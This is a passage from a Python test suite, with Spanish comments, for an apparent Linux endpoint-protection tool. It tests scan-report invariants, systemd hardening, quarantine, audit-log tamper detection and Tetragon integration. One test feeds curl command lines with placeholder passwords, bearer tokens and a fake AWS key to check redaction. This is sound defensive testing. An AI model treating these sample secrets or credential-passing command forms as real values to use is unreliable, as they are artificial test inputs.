        rep_threat = ScanReport(status=ScanStatus.THREAT, threat_name="Trojan.Generic", category="NATIVE_SIGNATURE")
        self.assertIs(rep_threat.status, ScanStatus.THREAT)
        self.assertIs(rep_threat.is_clean, False)
        self.assertIs(rep_threat.is_threat, True)
        self.assertIs(rep_threat.is_indeterminate, False)

        # 3. INDETERMINATE válido: derivación automática de propiedades
        rep_indet = ScanReport(status=ScanStatus.INDETERMINATE, category="IO_ERROR", details="Disk failure")
        self.assertIs(rep_indet.status, ScanStatus.INDETERMINATE)
        self.assertIs(rep_indet.is_clean, False)
        self.assertIs(rep_indet.is_threat, None)
        self.assertIs(rep_indet.is_indeterminate, True)

        # 4. Invariante 1: CLEAN nunca puede tener is_threat=True
        with self.assertRaises(ValueError) as ctx1:
            ScanReport(status=ScanStatus.CLEAN, is_threat=True)
        self.assertIn("CLEAN nunca puede tener is_threat=True", str(ctx1.exception))

        # 5. Invariante 2: THREAT nunca puede tener is_clean=True (o is_threat=False)
        with self.assertRaises(ValueError) as ctx2:
            ScanReport(status=ScanStatus.THREAT, is_threat=False)
        self.assertIn("THREAT nunca puede tener is_threat=False o is_clean=True", str(ctx2.exception))

        # 6. Invariante 3: INDETERMINATE nunca puede tener is_clean=True (o is_threat=False) ni is_threat=True
        with self.assertRaises(ValueError) as ctx3a:
            ScanReport(status=ScanStatus.INDETERMINATE, is_threat=False)
        self.assertIn("INDETERMINATE nunca puede tener is_clean=True o is_threat=False", str(ctx3a.exception))

        with self.assertRaises(ValueError) as ctx3b:
            ScanReport(status=ScanStatus.INDETERMINATE, is_threat=True)
        self.assertIn("INDETERMINATE no es una amenaza confirmada", str(ctx3b.exception))

        # 7. Invariante 4: Ningún resultado incompleto puede convertirse en CLEAN
        for bad_cat in ["IO_ERROR", "ENGINE_ERROR", "READ_ERROR", "TIMEOUT", "PERMISSION_DENIED"]:
            with self.assertRaises(ValueError) as ctx4:
                ScanReport(status=ScanStatus.CLEAN, category=bad_cat)
            self.assertIn("Ningún resultado incompleto", str(ctx4.exception))

    # 131. Verificación del Instalador y Manejo de Dependencias y Servicio
    def test_installer_script_structure_and_dependencies(self):
        """
        Verifica que install.sh contenga:
        - Sintaxis Bash válida.
        - Detección de gestores de paquetes (apt, dnf, zypper, pacman).
        - Instalación de dependencias del sistema y de Python (requirements.txt).
        - Puerta de verificación (Verification Gate) de dependencias críticas y versión de Python.
        - Configuración, habilitación y arranque de constantine.service mediante systemctl.
        - Creación del symlink global /usr/local/bin/constantine.
        - Flags para entornos no interactivos (--no-deps, --skip-service-start).
        """
        import subprocess
        install_path = os.path.join(os.path.dirname(__file__), "..", "install.sh")
        self.assertTrue(os.path.exists(install_path), "install.sh debe existir")

        # 1. Comprobación de sintaxis Bash (bash -n)
        res = subprocess.run(["bash", "-n", install_path], capture_output=True, text=True)
        self.assertEqual(res.returncode, 0, f"Error de sintaxis en install.sh: {res.stderr}")

        with open(install_path, "r", encoding="utf-8") as f:
            script_text = f.read()

        # 2. Detección de gestores de paquetes
        self.assertIn("detect_package_manager", script_text)
        self.assertIn("apt-get", script_text)
        self.assertIn("dnf", script_text)
        self.assertIn("zypper", script_text)
        self.assertIn("pacman", script_text)

        # 3. Instalación de dependencias del sistema y Python
        self.assertIn("requirements.txt", script_text)
        self.assertIn("pip3 install", script_text)
        self.assertIn("python3-cryptography", script_text)
        self.assertIn("clamav", script_text)

        # 4. Puerta de verificación (Verification Gate)
        self.assertIn("Puerta de Verificación Operativa", script_text)
        self.assertIn("cryptography", script_text)
        self.assertIn("yaml", script_text)

        # 5. Configuración e inicio del servicio
        self.assertIn("systemctl daemon-reload", script_text)
        self.assertIn("systemctl enable constantine.service", script_text)
        self.assertIn("systemctl restart constantine.service", script_text)
        self.assertIn("systemctl is-active", script_text)

        # 6. Enlace simbólico CLI y flags
        self.assertIn("/usr/local/bin/constantine", script_text)
        self.assertIn("--no-deps", script_text)
        self.assertIn("--skip-service-start", script_text)

    # 132. Validación de Rutas de Construcción, Inmutabilidad, Categorías Extensibles y Pipeline IPC-GUI
    def test_scan_report_construction_routes_immutability_and_pipeline(self):
        """
        Valida rigurosamente los 4 requerimientos formales:
        1. Validación en TODAS las rutas de construcción: from_dict(), _make(), _replace(), copias.
           Ninguna ruta permite introducir estados contradictorios.
        2. Categorías de error extensibles: registro formal ScanCategoryRegistry,
           categorías desconocidas NUNCA terminan en CLEAN (Fail-Secure).
        3. Serialización sin pérdida de información:
           ScanReport -> to_dict() -> IPC -> reconstrucción -> GUI conserva INDETERMINATE en cada etapa.
        4. Inmutabilidad real: _status protegido contra modificaciones directas y delattr.
        """
        from core.engine.scanner import ScanCategoryRegistry, CategoryClassification
        import copy

        # --- 1. VALIDACIÓN EN TODAS LAS RUTAS DE CONSTRUCCIÓN ---

        # 1.1 from_dict() con datos válidos
        d_clean = {"status": "CLEAN", "threat_name": "CLEAN", "category": "BENIGN"}
        rep1 = ScanReport.from_dict(d_clean)
        self.assertIs(rep1.status, ScanStatus.CLEAN)
        self.assertIs(rep1.is_clean, True)

        d_indet = {"status": "INDETERMINATE", "details": "Read error", "category": "IO_ERROR"}
        rep2 = ScanReport.from_dict(d_indet)
        self.assertIs(rep2.status, ScanStatus.INDETERMINATE)
        self.assertIs(rep2.is_indeterminate, True)

        # 1.2 from_dict() con datos contradictorios RECHAZADOS
        with self.assertRaises(ValueError):
            ScanReport.from_dict({"status": "CLEAN", "is_threat": True, "category": "BENIGN"})
        with self.assertRaises(ValueError):
            ScanReport.from_dict({"status": "THREAT", "is_clean": True, "category": "MALWARE"})
        with self.assertRaises(ValueError):
            ScanReport.from_dict({"status": "INDETERMINATE", "is_clean": True, "category": "IO_ERROR"})
        with self.assertRaises(ValueError):
            ScanReport.from_dict({"is_clean": True, "is_threat": True, "category": "BENIGN"})

        # 1.3 _make() con datos contradictorios RECHAZADOS
        # Secuencia: (is_threat, threat_name, score, engine, details, severity, category, sha256, status)
        with self.assertRaises(ValueError):
            ScanReport._make((True, "CLEAN", 0, "Eng", "Det", "LOW", "BENIGN", "hash", ScanStatus.CLEAN))
        with self.assertRaises(ValueError):
            ScanReport._make((False, "Threat", 100, "Eng", "Det", "CRITICAL", "MALWARE", "hash", ScanStatus.THREAT))
        with self.assertRaises(ValueError):
            ScanReport._make((False, "Indet", 0, "Eng", "Det", "HIGH", "IO_ERROR", "hash", ScanStatus.INDETERMINATE))

        # 1.4 _replace() con datos contradictorios RECHAZADOS
        base_clean = ScanReport(status=ScanStatus.CLEAN, threat_name="CLEAN", category="BENIGN")
        with self.assertRaises(ValueError):
            base_clean._replace(is_threat=True)
        with self.assertRaises(ValueError):
            base_clean._replace(category="IO_ERROR")

        base_threat = ScanReport(status=ScanStatus.THREAT, threat_name="Trojan", category="MALWARE")
        with self.assertRaises(ValueError):
            base_threat._replace(status=ScanStatus.CLEAN)

        base_indet = ScanReport(status=ScanStatus.INDETERMINATE, details="Error", category="IO_ERROR")
        with self.assertRaises(ValueError):
            base_indet._replace(status=ScanStatus.CLEAN)

        # 1.5 Copias y transformaciones respetan invariantes e inmutabilidad
        copied_rep = copy.copy(base_indet)
        self.assertIs(copied_rep.status, ScanStatus.INDETERMINATE)
        self.assertIs(copied_rep.is_indeterminate, True)
        self.assertEqual(copied_rep.category, "IO_ERROR")

        # --- 2. CATEGORÍAS DE ERROR EXTENSIBLES Y FAIL-SECURE ---

        # 2.1 Categoría desconocida NUNCA puede terminar en CLEAN
        for unknown_cat in ["UNKNOWN_FUTURE_ENGINE_ERROR", "CUSTOM_NEW_CORRUPT_TYPE", "XYZ_HARDWARE_FAILURE"]:
            self.assertFalse(ScanCategoryRegistry.is_status_allowed(unknown_cat, ScanStatus.CLEAN))
            with self.assertRaises(ValueError) as ctx_unk:
                ScanReport(status=ScanStatus.CLEAN, category=unknown_cat)
            self.assertIn("Ningún resultado incompleto o no clasificado como benigno", str(ctx_unk.exception))

            # Inferencia automática sobre categoría desconocida debe resolver a INDETERMINATE, jamás a CLEAN
            inferred_status = ScanCategoryRegistry.infer_status_for_category(unknown_cat, is_threat=False)
            self.assertEqual(inferred_status, ScanStatus.INDETERMINATE)

        # 2.2 Registro extensible de nuevas categorías
        ScanCategoryRegistry.register_category("NEW_ADVANCED_THREAT_TYPE", CategoryClassification.THREAT_CONFIRMED, {ScanStatus.THREAT})
        self.assertTrue(ScanCategoryRegistry.is_status_allowed("NEW_ADVANCED_THREAT_TYPE", ScanStatus.THREAT))
        self.assertFalse(ScanCategoryRegistry.is_status_allowed("NEW_ADVANCED_THREAT_TYPE", ScanStatus.CLEAN))

        ScanCategoryRegistry.register_category("NEW_PARTIAL_READ_ERROR", CategoryClassification.INCOMPLETE_ERROR, {ScanStatus.INDETERMINATE})
        self.assertTrue(ScanCategoryRegistry.is_status_allowed("NEW_PARTIAL_READ_ERROR", ScanStatus.INDETERMINATE))
        self.assertFalse(ScanCategoryRegistry.is_status_allowed("NEW_PARTIAL_READ_ERROR", ScanStatus.CLEAN))

        # --- 3. SERIALIZACIÓN SIN PÉRDIDA DE INFORMACIÓN: ScanReport -> to_dict() -> IPC -> GUI ---

        # 3.1 Creación del ScanReport INDETERMINATE inicial
        initial_indet = ScanReport(
            status=ScanStatus.INDETERMINATE,
            threat_name="INDETERMINATE",
            score=0,
            engine="TestEngine",
            details="Disco bloqueado por E/S",
            severity="HIGH",
            category="IO_ERROR",
            sha256=""
        )
        self.assertIs(initial_indet.status, ScanStatus.INDETERMINATE)
        self.assertIs(initial_indet.is_indeterminate, True)
        self.assertIs(initial_indet.is_clean, False)

        # 3.2 to_dict() preserva status y banderas tripartitas
        serialized_dict = initial_indet.to_dict()
        self.assertEqual(serialized_dict["status"], "INDETERMINATE")
        self.assertTrue(serialized_dict["is_indeterminate"])
        self.assertFalse(serialized_dict["is_clean"])
        self.assertIsNone(serialized_dict["is_threat"])

        # 3.3 Transmisión y deserialización IPC (from_dict)
        deserialized_ipc = ScanReport.from_dict(serialized_dict)
        self.assertIs(deserialized_ipc.status, ScanStatus.INDETERMINATE)
        self.assertIs(deserialized_ipc.is_indeterminate, True)
        self.assertIs(deserialized_ipc.is_clean, False)
        self.assertEqual(deserialized_ipc.category, "IO_ERROR")

        # 3.4 Consumo en GUI Controller
        from gui.app import ConstantineUIController
        ctrl = ConstantineUIController()
        with patch.object(ctrl.client, "send_command", return_value={"status": "OK", "data": deserialized_ipc.to_dict()}):
            gui_result = ctrl.run_custom_scan("/some/test_file.bin")
            self.assertEqual(gui_result["indeterminates_count"], 1)
            self.assertEqual(len(gui_result["indeterminates"]), 1)
            self.assertEqual(gui_result["indeterminates"][0]["status"], "INDETERMINATE")
            self.assertEqual(gui_result["threats_count"], 0)

        # --- 4. INMUTABILIDAD REAL ---

        # 4.1 Modificación directa de _status rechazada
        with self.assertRaises(AttributeError) as ctx_imm1:
            initial_indet._status = ScanStatus.CLEAN
        self.assertIn("es inmutable", str(ctx_imm1.exception))

        # 4.2 Modificación de propiedades derivadas o status rechazada
        with self.assertRaises(AttributeError):
            initial_indet.status = ScanStatus.CLEAN
        with self.assertRaises(AttributeError):
            initial_indet.is_clean = True
        with self.assertRaises(AttributeError):
            initial_indet.is_threat = False

        # 4.3 Eliminación de atributos rechazada
        with self.assertRaises(AttributeError):
            del initial_indet._status

        # 4.4 Modificación de category para eludir invariante rechazada
        with self.assertRaises(ValueError):
            initial_indet.category = "BENIGN"

    # 133. Separación de Permisos Inspección vs Remediación y Hardening EDR
    def test_systemd_edr_operational_compatibility(self):
        """
        Verifica la separación de permisos de inspección vs remediación y hardening systemd:
        1. Separación de planos: RemediationPrivilegeScope delimita la ventana de mutación.
        2. ProtectKernelModules=true: Protege el kernel contra módulos no autorizados (.ko),
           ya que eBPF opera vía syscall bpf() y tracepoints sin requerir carga de módulos.
        3. Semántica de SystemCallFilter: Whitelist enriquecida con @system-service, @network-io,
           @file-system, bpf, perf_event_open, fanotify_init, fanotify_mark.
        4. CapabilityBoundingSet y AmbientCapabilities: Delimitación de capacidades.
        5. Supervisión de archivos personales: /home y /tmp accesibles para remediación atómica.
        """
        from core.engine.quarantine_operator import RemediationPrivilegeScope

        # 1. Separación de permisos de inspección y remediación
        target = "/home/user/malware.sh"
        with RemediationPrivilegeScope(target) as scope:
            self.assertTrue(scope.active)
            self.assertEqual(scope.target_path, target)
        self.assertFalse(scope.active)

        # 2. Auditoría del archivo de servicio
        service_file = os.path.join(ROOT_DIR, "service", "constantine.service")
        auditor = SystemdSecurityAuditor(unit_path=service_file)
        posture = auditor.evaluate_security_posture()

        self.assertTrue(posture["unit_found"])
        self.assertGreaterEqual(posture["score"], 90)
        self.assertEqual(posture["rating"], "HARDENED_EXCELLENT")

        self.assertIn("FileSupervision", posture["passed_checks"])
        self.assertIn("KernelHardening", posture["passed_checks"])
        self.assertIn("SystemCallFilter", posture["passed_checks"])
        self.assertIn("CapabilityBoundingSet", posture["passed_checks"])

        with open(service_file, "r") as f:
            text = f.read()
        self.assertIn("ProtectKernelModules=true", text)
        self.assertIn("perf_event_open", text)
        self.assertIn("bpf", text)
        self.assertIn("fanotify_init", text)
        self.assertIn("fanotify_mark", text)
        self.assertIn("CAP_DAC_OVERRIDE", text)
        self.assertIn("CAP_BPF", text)
        self.assertIn("CAP_PERFMON", text)
        self.assertIn("CAP_SYS_ADMIN", text)
        self.assertIn("/home", text)

        # 3. Verificación de cálculo formal de SystemCallFilter y justificaciones
        sc_eval = posture["syscall_filter_audit"]
        self.assertTrue(sc_eval["is_valid"])
        self.assertTrue(sc_eval["edr_syscalls_verified"])
        self.assertTrue(sc_eval["dangerous_groups_blocked"])
        self.assertIn("@system-service", sc_eval["group_justifications"])
        self.assertIn("@network-io", sc_eval["group_justifications"])
        self.assertIn("@file-system", sc_eval["group_justifications"])

        # 4. Evaluación de perfiles de capacidades kernel-aware
        # 4a. Perfil moderno (kernel >= 5.8): óptimo con CAP_BPF y CAP_PERFMON sin requerir CAP_SYS_ADMIN
        modern_caps_strict = "CAP_NET_ADMIN CAP_KILL CAP_DAC_OVERRIDE CAP_DAC_READ_SEARCH CAP_BPF CAP_PERFMON CAP_SYS_PTRACE CAP_SYS_RESOURCE CAP_IPC_LOCK"
        ok_mod, msg_mod, det_mod = auditor.check_capability_bounding_set(modern_caps_strict, kernel_version="6.5.0-generic")
        self.assertTrue(ok_mod)
        self.assertTrue(det_mod["least_privilege_optimal"])
        self.assertFalse(det_mod["has_sys_admin"])

        # 4b. Perfil compatible heredado (kernel < 5.8): requiere CAP_SYS_ADMIN
        legacy_caps = "CAP_SYS_ADMIN CAP_NET_ADMIN CAP_KILL CAP_DAC_OVERRIDE CAP_DAC_READ_SEARCH CAP_SYS_PTRACE CAP_SYS_RESOURCE CAP_IPC_LOCK"
        ok_leg, msg_leg, det_leg = auditor.check_capability_bounding_set(legacy_caps, kernel_version="5.4.0-generic")
        self.assertTrue(ok_leg)
        self.assertTrue(det_leg["has_sys_admin"])

        # 4c. Rechazo de capacidades peligrosas / no necesarias (CAP_SYS_BOOT)
        bad_caps = "CAP_SYS_ADMIN CAP_SYS_BOOT CAP_BPF CAP_PERFMON CAP_DAC_OVERRIDE CAP_DAC_READ_SEARCH"
        ok_bad, msg_bad, _ = auditor.check_capability_bounding_set(bad_caps, kernel_version="6.5.0-generic")
        self.assertFalse(ok_bad)
        self.assertIn("CAP_SYS_BOOT", msg_bad)

        # 5. Pruebas avanzadas de semántica seccomp de SystemCallFilter
        # 5a. Semántica estricta seccomp: Deny es definitivo (~@obsolete bloquea sysfs aunque @file-system esté en allowlist)
        rules_complex = [
            "@system-service @network-io @file-system bpf perf_event_open fanotify_init fanotify_mark",
            "~@obsolete @reboot @swap sysfs"
        ]
        sc_eval_comp = SystemCallFilterEvaluator(rules_complex, architecture="native")
        res_comp = sc_eval_comp.compute_effective_posture()
        self.assertTrue(res_comp["is_valid"])
        self.assertTrue(res_comp["edr_syscalls_verified"])
        self.assertIn("sysfs", res_comp["explicit_denied_syscalls"])

        # 5b. Rechazo de arquitectura extranjera no nativa
        sc_eval_foreign = SystemCallFilterEvaluator(rules_complex, architecture="mips64")
        self.assertFalse(sc_eval_foreign.compute_effective_posture()["is_valid"])

        # 6. Sondeo funcional activo eBPF de operaciones concretas (EBPFCapabilityProber)
        from core.engine.systemd_hardening import EBPFCapabilityProber
        probe_res = EBPFCapabilityProber.probe_ebpf_runtime()
        self.assertIn("is_modern_kernel", probe_res)
        self.assertIn("bpf_syscall_available", probe_res)
        self.assertIn("perf_event_open_available", probe_res)
        self.assertIn("can_drop_sys_admin", probe_res)
        self.assertIn("lockdown_mode", probe_res)
        self.assertIn("recommended_profile", probe_res)
        self.assertEqual(probe_res["fallback_strategy"], "GRACEFUL_DEGRADATION_MODE_PROC")
        self.assertTrue(res_comp["core_bootstrap_verified"])
        self.assertIn("bpf_map_create_probe", probe_res)
        self.assertIn("telemetry_state", probe_res)
        self.assertIn("telemetry_description", probe_res)

        # 7. Verificación de capacidades en /proc/self/status (5 máscaras Linux)
        from core.engine.quarantine_operator import read_process_capabilities, NonceReplayCache
        proc_caps = read_process_capabilities()
        self.assertIn("CapInh", proc_caps)
        self.assertIn("CapPrm", proc_caps)
        self.assertIn("CapEff", proc_caps)
        self.assertIn("CapBnd", proc_caps)
        self.assertIn("CapAmb", proc_caps)

        # 8. Verificación de NonceReplayCache sincronizada y acotada con TTL
        cache = NonceReplayCache(ttl=2.0, max_size=5)
        now_ts = time.time()
        self.assertTrue(cache.check_and_add("nonce1", now_ts))
        self.assertFalse(cache.check_and_add("nonce1", now_ts)) # Replay rechazado
        self.assertTrue(cache.check_and_add("nonce1", now_ts + 3.0)) # Aceptado tras expirar TTL
        # 9. Validación dinámica de llamadas al sistema con semántica seccomp
        self.assertTrue(sc_eval_comp.validate_syscall_execution("bpf")[0])
        self.assertTrue(sc_eval_comp.validate_syscall_execution("read")[0])
        self.assertFalse(sc_eval_comp.validate_syscall_execution("sysfs")[0])
        self.assertFalse(sc_eval_comp.validate_syscall_execution("reboot")[0])

        # 10. Verificación de aislamiento estricto de CAP_DAC_OVERRIDE en demonio
        from core.engine.quarantine_operator import verify_daemon_capability_isolation, canonical_command_payload
        ok_iso, msg_iso, _ = verify_daemon_capability_isolation()
        self.assertTrue(ok_iso)
        self.assertIn("CAP_DAC_OVERRIDE ausente", msg_iso)

        # 11. Codificación canónica inequívoca de payloads de remediación
        canon = canonical_command_payload("SECURE_UNLINK", "/tmp/mal.sh", 123, 456, "abc", 1700000000.123456)
        self.assertIn(b"CMD=13:SECURE_UNLINK", canon)
        self.assertIn(b"PATH=11:/tmp/mal.sh", canon)
        self.assertIn(b"DEV=123", canon)
        self.assertIn(b"INO=456", canon)

        # 12. Orquestador eBPF: 4 estados formales y descripción de degradación
        from core.engine.ebpf_monitor import EBPFMonitor
        ebpf_mon = EBPFMonitor(fallback_mode=True)
        self.assertEqual(ebpf_mon.telemetry_state, "MONITORING_DISABLED") # no iniciado
        ebpf_mon.start()
        self.assertEqual(ebpf_mon.telemetry_state, "DEGRADED_PROC_FALLBACK")
        self.assertIn("latencia de muestreo y procesos efímeros", ebpf_mon.telemetry_description)
        ebpf_mon.stop()
        self.assertEqual(ebpf_mon.telemetry_state, "MONITORING_DISABLED")
        # 13. Autoridad centralizada del supervisor sobre repetición de transacciones
        from core.engine.quarantine_operator import SUPERVISOR_REPLAY_CACHE
        ts_sup = time.time()
        self.assertTrue(SUPERVISOR_REPLAY_CACHE.check_and_add("sup_nonce_1", ts_sup))
        self.assertFalse(SUPERVISOR_REPLAY_CACHE.check_and_add("sup_nonce_1", ts_sup))

        # 14. GUI: diferenciación de estado EBPF_PARTIAL como PROTECTED_PARTIAL (WARNING)
        from gui.app import ConstantineUIController
        ctrl_part = ConstantineUIController()
        mock_status_part = {
            "status": "OK",
            "data": {
                "daemon_running": True,
                "fanotify": "ACTIVE",
                "fanotify_operational": True,
                "ebpf": "ACTIVE",
                "ebpf_telemetry_state": "EBPF_PARTIAL",
                "ebpf_telemetry_description": "Tracepoints activos sin BPF LSM",
                "vault": "ACTIVE"
            }
        }
        with patch.object(ctrl_part, "get_daemon_status", return_value=mock_status_part):
            home_part = ctrl_part.get_home_section()
            self.assertEqual(home_part["status_code"], "PROTECTED_PARTIAL")
            self.assertEqual(home_part["status_level"], "WARNING")
            self.assertIn("PARCIAL", home_part["status_title"])

        # 15. Auditoría exhaustiva de 5 máscaras de capacidades
        _, _, cap_details = verify_daemon_capability_isolation()
        self.assertIn("CapInh", cap_details)
        self.assertIn("CapPrm", cap_details)
        self.assertIn("CapEff", cap_details)
        self.assertIn("CapBnd", cap_details)
        self.assertIn("CapAmb", cap_details)
        self.assertTrue(cap_details["isolation_verified"])

        # 16. Protección de permisos de audit log (0600) y encadenamiento criptográfico
        from core.engine.audit_logger import AuditLogger
        al = AuditLogger(log_dir=self.temp_dir.name)
        al.log_event("TEST_PERM_CHECK", {"status": "OK"})
        st_log = os.stat(al.log_file)
        self.assertEqual(stat.S_IMODE(st_log.st_mode), 0o600)

        # 17. Verificación de hash-chaining en AuditLogger
        al.log_event("TEST_CHAIN_2", {"data": 123})
        ok_chain, msg_chain, count_chain = al.verify_chain_integrity()
        self.assertTrue(ok_chain)
        self.assertEqual(count_chain, 2)

        # Tampering test
        with open(al.log_file, "r", encoding="utf-8") as f:
            lines = f.readlines()
        tampered_entry = json.loads(lines[0])
        tampered_entry["details"]["status"] = "TAMPERED"
        lines[0] = json.dumps(tampered_entry) + chr(10)
        with open(al.log_file, "w", encoding="utf-8") as f:
            f.writelines(lines)
        ok_tamper, msg_tamper, _ = al.verify_chain_integrity()
        self.assertFalse(ok_tamper)
        self.assertIn("alterado", msg_tamper)

        # 18. secure_rename_noreplace con RENAME_NOREPLACE previniendo sobrescritura en rollback
        from core.engine.quarantine_operator import secure_rename_noreplace, cleanup_orphan_staging
        fd_src = os.open(self.temp_dir.name, os.O_RDONLY | os.O_DIRECTORY)
        try:
            f_src = os.path.join(self.temp_dir.name, "src_sample.bin")
            f_dst = os.path.join(self.temp_dir.name, "dst_sample.bin")
            with open(f_src, "w") as f: f.write("sample")
            with open(f_dst, "w") as f: f.write("innocent")
            with self.assertRaises(FileExistsError):
                secure_rename_noreplace(fd_src, "src_sample.bin", fd_src, "dst_sample.bin")
            # Verificar que el archivo destino se mantuvo intacto
            with open(f_dst, "r") as f:
                self.assertEqual(f.read(), "innocent")
        finally:
            os.close(fd_src)

        # 19. vault.restore_file previene sobrescritura con O_EXCL
        from core.engine.vault import CryptographicVault
        test_v = CryptographicVault(base_dir=self.temp_dir.name)
        t_file = os.path.join(self.temp_dir.name, "vault_test_orig.bin")
        with open(t_file, "w") as f: f.write("threat content")
        ok_q, s_id = test_v.quarantine_file(t_file)
        self.assertTrue(ok_q)
        # Crear archivo concurrente en destino
        with open(t_file, "w") as f: f.write("concurrent innocent file")
        ok_res, res_msg = test_v.restore_file(s_id, t_file)
        self.assertFalse(ok_res)
        self.assertIn("ya existe", res_msg)
        # Verificar que el inocente no fue destruido
        with open(t_file, "r") as f:
            self.assertEqual(f.read(), "concurrent innocent file")

        # 20. cleanup_orphan_staging
        cleaned = cleanup_orphan_staging(max_age_seconds=0.0)
        self.assertIsInstance(cleaned, int)

        # 21. Sondeo eBPF BPF_PROG_LOAD
        from core.engine.systemd_hardening import EBPFCapabilityProber
        prog_ok, prog_err, prog_msg = EBPFCapabilityProber.probe_bpf_prog_load()
        self.assertIsInstance(prog_ok, bool)
        self.assertIsInstance(prog_err, int)

        # 22. Tetragon: Verificación de conexión real a socket y diferenciación de modo emulador
        import socket
        test_sock_path = os.path.join(self.temp_dir.name, "tetragon_test.sock")
        t_mon = TetragonMonitor(socket_path=test_sock_path)
        # Sin socket activo
        probe_init = t_mon.probe_integration()
        self.assertEqual(probe_init["mode"], "STANDALONE_POLICY_EMULATOR")
        self.assertFalse(probe_init["daemon_running"])
        self.assertIn("autónoma", probe_init["details"])

        # Con socket simulado real que responde
        server_s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        server_s.bind(test_sock_path)
        server_s.listen(10)
        try:
            probe_live = t_mon.probe_integration()
            self.assertEqual(probe_live["mode"], "LIVE_TETRAGON_DAEMON")
            self.assertTrue(probe_live["daemon_running"])
            self.assertIn("Conexión activa", probe_live["details"])

            # Probar start/stop con conexión real
            t_mon.start()
            self.assertTrue(t_mon.running)
            self.assertTrue(t_mon.connected_to_daemon)
            t_mon.stop()
            self.assertFalse(t_mon.running)
            self.assertFalse(t_mon.connected_to_daemon)

            # 23. Verificación de 7 campos de telemetría, sanitización y transparencia Tetragon
            self.assertIn("connection_state", probe_live)
            self.assertEqual(probe_live["connection_state"], "CONNECTED_HEALTHY")
            self.assertIn("detected_version", probe_live)
            self.assertIn("service_version", probe_live)
            self.assertIn("events_telemetry", probe_live)
            self.assertEqual(probe_live["events_telemetry"]["received"], 0)
            self.assertIn("last_event", probe_live)
            self.assertIn("communication_errors", probe_live)
            self.assertIn("total_errors", probe_live["communication_errors"])
            self.assertIn("external_policies_status", probe_live)
            self.assertIn("state", probe_live["external_policies_status"])
            self.assertIn("constantine_enforcement_status", probe_live)
            self.assertEqual(probe_live["constantine_enforcement_status"], "TETRAGON_GRPC_PASSTHROUGH")
            self.assertEqual(probe_init["constantine_enforcement_status"], "CONSTANTINE_EBPF_EMULATION")
            self.assertEqual(probe_init["connection_state"], "NOT_INSTALLED")

            # 24. Sanitización adversarial de argumentos en eventos
            from core.engine.tetragon_monitor import sanitize_process_arguments
            raw_args = ["curl", "--password", "super_secret_pwd_123", "https://example.com/api?token=secret_token_abc", "normal_arg"]
            sanitized = sanitize_process_arguments("/usr/bin/curl", raw_args)
            self.assertNotIn("super_secret_pwd_123", " ".join(sanitized))
            self.assertNotIn("secret_token_abc", " ".join(sanitized))
            self.assertIn("***", " ".join(sanitized))
            self.assertIn("normal_arg", sanitized)

            # Casos adversariales exhaustivos v5.4.7 (espacios, URL-encoding, env vars, ANSI)
            adv_args = [
                "curl",
                "--PASSWORD", "secreto_upper_flag",
                "--password=secreto_inline_eq",
                "--token:secreto_inline_colon",
                "-p", "secreto_short_p",
                "-H", "Authorization: Bearer secreto_bearer_token",
                "-u", "admin:secreto_user_pass",
                "https://appuser:secreto_url_pass@example.com/api",
                '--password="secret with spaces"',
                "https://api.internal?token=secret%20with%20escapes",
                "AWS_SECRET_ACCESS_KEY=AKIA1234567890SECRETKEY",
                "export API_KEY=secret_api_key_xyz",
                "[31m--password[0m", "colored_secret_pwd",
                "--custom-secret-key=hidden_token_12345"
            ]
            adv_sanitized = sanitize_process_arguments("/usr/bin/curl", adv_args)
            adv_str = " ".join(adv_sanitized)
            for s in [
                "secreto_upper_flag", "secreto_inline_eq", "secreto_inline_colon",
                "secreto_short_p", "secreto_bearer_token", "secreto_user_pass",
                "secreto_url_pass", "secret with spaces", "secret%20with%20escapes",
                "AKIA1234567890SECRETKEY", "secret_api_key_xyz", "colored_secret_pwd",
                "hidden_token_12345"
            ]:
                self.assertNotIn(s, adv_str)
            self.assertIn("***", adv_str)

            # 25. Verificación de planos tripartitas, salud desacoplada y ciclo de vida de acciones v5.4.7
            self.assertIn("connectivity_status", probe_live)
            self.assertIn("external_policy_status", probe_live)
            self.assertIn("enforcement_capability", probe_live)
            self.assertEqual(probe_live["connectivity_status"], "CONNECTED_HEALTHY")

            # Indicadores de salud desacoplados (transport vs grpc_service)
            self.assertIn("transport_health", probe_live)
            self.assertIn("grpc_service_health", probe_live)
            self.assertIn("health_indicators", probe_live)
            self.assertEqual(probe_live["transport_health"], "HEALTHY")
            self.assertEqual(probe_live["grpc_service_health"], "SERVING")

            # Acciones auditadas y métricas desagregadas
            self.assertIn("actions", probe_live["events_telemetry"])
            self.assertIn("requested", probe_live["events_telemetry"]["actions"])
            self.assertIn("executed", probe_live["events_telemetry"]["actions"])
            self.assertIn("confirmed", probe_live["events_telemetry"]["actions"])
            self.assertIn("failed", probe_live["events_telemetry"]["actions"])
            self.assertIn("last_error_code", probe_live["communication_errors"])

            # Verificación criptográfica formal de políticas con hash SHA-256
            t_mon.connect_daemon()
            pname = t_mon.policies[0].get("metadata", {}).get("name", "test-policy")
            phash = t_mon.policy_hashes[pname]
            # Confirmación válida con hash y estado reportado por kernel
            valid_confirm = t_mon.confirm_policy_active(pname, phash, "APPLIED_IN_KERNEL")
            self.assertTrue(valid_confirm)
            self.assertEqual(t_mon.policy_status, "POLICY_ACTIVE")
            self.assertIn(pname, t_mon.policy_verifications)

            # Rechazo de confirmación con hash discrepante o expirado
            invalid_confirm = t_mon.confirm_policy_active(pname, "bad_hash_abc123", "APPLIED_IN_KERNEL")
            self.assertFalse(invalid_confirm)

            t_mon.stop()
            self.assertEqual(t_mon.policy_status, "POLICY_EXTERNAL_UNVERIFIED")
            self.assertEqual(t_mon.transport_health, "NOT_CONNECTED")
            self.assertEqual(t_mon.grpc_service_health, "UNAVAILABLE")
        finally:
            server_s.close()
            if os.path.exists(test_sock_path):
                os.unlink(test_sock_path)

    # 134. Tetragon v5.4.7: Desacoplamiento de Salud, Verificación Criptográfica con Nonces, pidfd y E2E Zero-Leakage
    def test_tetragon_v545_hardening_and_leakage_e2e(self):
        """
        Verifica el endurecimiento integral v5.4.7 de Tetragon:
        1. Decodificación recursiva acotada (recursive_unquote, max 3 pasadas).
        2. Hash canónico de políticas YAML con ordenamiento determinista (canonicalize_yaml).
        3. Extracción robusta de starttime en /proc/[pid]/stat con espacios y paréntesis en comm.
        4. Ciclo de vida de contención: pidfd nativo, SIGKILL real y métrica confirmation_unavailable.
        5. Salud desacoplada: transporte (transport_health) vs servicio (grpc_service_health),
           garantizando que la caída del socket fuerce UNAVAILABLE sin corromper estados de aplicación.
